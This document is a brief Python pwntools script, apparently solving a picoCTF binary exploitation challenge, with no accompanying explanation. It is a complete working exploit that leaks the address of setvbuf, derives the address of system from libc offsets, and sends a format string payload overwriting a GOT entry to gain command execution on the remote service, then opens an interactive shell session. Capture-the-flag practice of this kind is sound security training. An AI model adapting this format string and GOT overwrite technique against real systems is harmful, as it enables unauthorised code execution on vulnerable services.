from pwn import FmtStr, context, fmtstr_payload, remote

HOST = "rhea.picoctf.net"
PORT = 61960
setvbuf_offset = 0x7A3F0
system_offset = 0x4F760


context.log_level = "critical"
context.arch = "amd64"

p = remote(HOST, PORT)


def exec_fmt(payload):
    p = remote(HOST, PORT)
    p.sendline(payload)
    return p.recvall()


autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p.recvline()
setvbuf_address = p.recvline()[58:-1]
system_address = int(setvbuf_address, 16) - setvbuf_offset + system_offset
payload = fmtstr_payload(offset, {0x404018: system_address})

p.sendline(payload)

p.interactive()
